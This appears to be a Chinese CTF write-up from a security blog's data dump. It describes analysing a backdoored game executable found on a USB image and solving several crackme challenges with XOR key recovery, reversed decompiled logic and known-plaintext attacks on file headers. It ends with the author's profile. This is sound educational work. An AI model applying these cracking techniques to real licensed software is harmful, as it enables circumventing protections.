U盘病毒UP_BOOT.img解压之后是两个文件autorun.txt和是男人你就下100层.exe，autorun.txt中的内容是”你真厉害都到这了，看看这个游戏你肯定会喜欢的，但是据说这个游戏是被加了后门的，找到后门操作的文件的内容，取文件内容的16位md5值作为key！祝你好运…….”。根据题目知道是男人你就下100层.exe添加了后门，那么在执行的时候肯定要释放后门，所以找了一款 文件操作监控工具 进行监测，添加了文件创建，进程创建监测，然后发现在tmp目录中创建了RarSFX0目录，然后在RarSFX0中创建了1.exe, 1.vbs, 2.exe，以及test.txt，简单查看1.vbs启动1.exe和2.exe，1.exe是后门，2.exe是原始的是男人你就下100层.exe，test.txt时候后门生成的，题目中要后门操作文件的·内容·16位md5作为key，那么1.exe，2.exe不大可能，只有1.vbs和test.txt了，提交了两次，test.txt的内容md5成功。 2.crack1代码很简单，输入用户名密码之后，讲密码每个字符和408030所在内存的数据xor得到的值和用户名比较，相同则成功。用了个py脚本将用户名和408030内存的值xor得到密码，然后密码的md5即是key12345678910k = [1, 2, 3, 4, 1, 5]#408030的值，还有其他的n = &quot;xxxxx&quot;#用户名a = &quot;&quot;for i in range(0, len(n)): k1 = ord(n[i]) k1 = k[i] ^ k1 a = a + chr(k1) print a 3.crack2反调试太多，没搞定 4.crack3程序流程是，多次右键或者左键点击，会给403070写入R或者L字符，48次之后，点击确认，如果右键活左键点击姿势正确，就可以弹出正确的key。验证过程是，通过48个L或者R可到key，如果通过48个L或者R的一个算法得到”查水表“三个字，那么点击姿势正确，key也正确，所以需要通过”查水表“的值逆推得到L和R的个数，具体算法是：1234567891011121314151617181920do &#123; v11[v2] = 0; v3 = v1; if ( __SETO__(v1, v1 + 8) ^ 1 ) &#123; do &#123; v4 = 2 * v11[v2]; v5 = a1[v3] == 0x52; v11[v2] = v4; if ( v5 ) v11[v2] = v4 + 1; ++v3; &#125; while ( v3 &lt; v1 + 8 ); &#125; v1 += 8; ++v2; &#125; ”查水表“的值是B2 E9 CB AE B1 ED，通过上面算法和B2 E9 CB AE B1 ED推得点击姿势是:RLRRLLRLRRRLRLLRRRLLRLRRRLRLRRRLRLRRLLLRRRRLRRLR然后，操作一次，或者调试器内存修改，都可以得到key 5.crack4题目是”输入正确的密码，会释放出文件。key就在文件中。tips:第一层密码为6为纯数字，第二层密码也是6位。“粗略分析，输入第一次密码，释放并解密得到encrypt.exe，是一个exe，运行这个exe，输入第二次密码，释放并解密得到一个gif，密码验证算法是md5(md5(“HOWMPxxxxxx”)) == 09B2F924C20C5CA427EED2C5B98BEFBF，xxxxxx就是密码，先前一直想md5算出来，，没可能，后面发现释放文件之后的解密算法是xor，那么，嘿嘿，exe和gif格式的开头几个字节都是固定的，那么通过加密文件和正常文件的前6个字节xor即可得到密码，分别是564987和w!q&amp;cs12MZ...... =&gt;4D 5A 00 00 00 00 xor 78 6C 34 39 38 37 =&gt;35 36 34 49 48 47 =》564987GIF89aX =》47 49 46 38 39 61 58 xor 30 68 37 1E 5A 12 =&gt; w!q&amp;cs 最后得到解密之后的图片，图片就有key 6.crack5这到题太坑，点击注册啥反应没有，以为是没有调用注册功能函数，后来通过网上的特征码定位到了注册按钮的函数，地址是：00401640，结果一看代码全是混淆，各种int 3，jmp，，完全无法正常执行，所以点击之后无反应，尝试恢复，大概流程得到，先UpdateData获取到输入，然后一段算法比较，MessageBox注册成功或者失败。。但是加密算法那部分，实在是无力恢复了。","tags":[{"name":"ssctf","slug":"ssctf","permalink":"https://anhkgg.github.io/tags/ssctf/"}]},{"title":"关于我","date":"2014-05-16T15:42:01.000Z","path":"aboutme/","text":"0x00. 联系我 anhkgg@163.com github.com/anhkgg http://weibo.com/u/5829043072 https://anhkgg.github.com 0x01. 方向 Windows Kernel/内核研究 Rootkit Reverse Engineer/逆向分析 Expolit/漏洞分析挖掘 0x02. 学校 暂时保密 暂时保密 0x03. 工作 暂时保密 暂时保密","tags":[{"name":"aboutme","slug":"aboutme","permalink":"https://anhkgg.github.io/tags/aboutme/"}]}]